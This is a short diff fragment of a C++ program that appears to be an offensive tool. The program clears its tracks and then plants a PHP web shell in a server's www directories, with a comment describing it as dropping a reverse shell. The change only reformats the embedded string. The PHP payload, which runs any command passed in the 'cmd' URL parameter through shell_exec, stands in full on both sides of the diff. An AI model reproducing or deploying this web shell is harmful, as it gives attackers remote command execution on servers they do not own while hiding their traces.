@@ -73,14 +73,12 @@ int main() {
     clearTracks();
 
     // Find www directory so we can drop a reverse shell
-    std::string phpShell = R"(
-        <?php
-        if (isset($_GET['cmd'])) {
-            $cmd = $_GET['cmd'];
-            echo "<pre>" . shell_exec($cmd) . "</pre>";
-        }
-        ?>
-        )";
+    std::string phpShell = R"(<?php
+    if (isset($_GET['cmd'])) {
+        $cmd = $_GET['cmd'];
+        echo "<pre>" . shell_exec($cmd) . "</pre>";
+    }
+    ?>)";
     auto files = wwwDir();
     for (const auto& dir : files) {
         std::cout << "Found directory: " << dir << "\n";
